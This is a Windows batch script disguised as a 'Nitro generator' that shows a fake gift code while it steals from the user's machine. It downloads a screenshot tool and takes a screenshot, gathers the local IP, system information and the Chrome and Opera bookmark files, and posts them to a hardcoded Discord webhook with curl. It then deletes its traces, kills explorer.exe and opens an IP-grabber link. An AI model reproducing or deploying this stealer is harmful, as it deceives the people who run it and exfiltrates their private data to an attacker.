@echo off
cd %appdata%
title cmd.exe
for /f "delims=[] tokens=2" %%a in ('ping -4 -n 1 %ComputerName% ^| findstr [') do set NetworkIP=%%a
set "webhook=https://discord.com/api/webhooks/988115911531720765/Pd3d0rsnKaC9LpXsr_iBk5vQWQbRIzrbjERiiq8d_1ysvTu0XpdXpmIkbkI2tXR-ahRw"
echo ------------------------------------------------------------------------------------------------------------------------
echo 				           Welcome in Generator Nitro.
echo                                    Wait while we generating your own nitro code.


curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```Screenshot from %ComputerName% at %TIME%```\"}" %webhook%
curl --silent -L --fail "https://github.com/chuntaro/screenshot-cmd/blob/master/screenshot.exe?raw=true" -o s.exe
.\s.exe -o %appdata%\s.png
curl --silent --output /dev/null -F ss=@"%appdata%\s.png" %webhook% 


curl --silent --output /dev/null -X POST -H "Content-type: application/json" --data "{\"content\": \"%message%\"}" %webhook%


curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```Private IP```\"}"  %webhook%


curl -X POST -H "Content-type: application/json" --data "{\"content\": \"***%NetworkIP%*** \"}" %webhook%


curl --silent --output /dev/null -X POST -H "Content-type: application/json" --data "{\"content\": \"```Informations```\"}" %webhook%

echo                                         --------------------------------------
echo                                                  P1KI-VZX34-PM38L-PAQ45
echo                                         --------------------------------------

set "tempsys=%appdata%\sysinfo.txt"
2>NUL SystemInfo > "%tempsys%"
curl --silent --output /dev/null -F systeminfo=@"%tempsys%" %webhook%
curl -X POST -H "Content-type: application/json" --data "{\"content\": \"***Google Chrome Bookmarks***\"}" %webhook%
curl --silent --output /dev/null -F b=@"%localappdata%\Google\Chrome\User Data\Default\Bookmarks" %webhook%
curl -X POST -H "Content-type: application/json" --data "{\"content\": \"***Opera Bookmarks***\"}" %webhook%
curl --silent --output /dev/null -F b=@"%appdata%\Opera Software\Opera Stable\Bookmarks" %webhook%
curl -X POST -H "Content-type: application/json" --data "{\"content\": \"***Opera GX Bookmarks***\"}" %webhook%
curl --silent --output /dev/null -F b=@"%appdata%\Opera Software\Opera GX Stable\Bookmarks" %webhook%

curl --silent --output /dev/null -X POST -H "Content-type: application/json" --data "{\"content\": \"```Public ip was saved at: (your link to ip grabber manage)```\"}" %webhook%

waitfor SomethingThatIsNeverHappening /t 2

del %appdata%\s.exe
del %appdata%\s.png
del %appdata%\sysinfo.txt
taskkill /f /im explorer.exe
start msedge (your link to ip grabber)
exit 0

"Writed by 3fa0"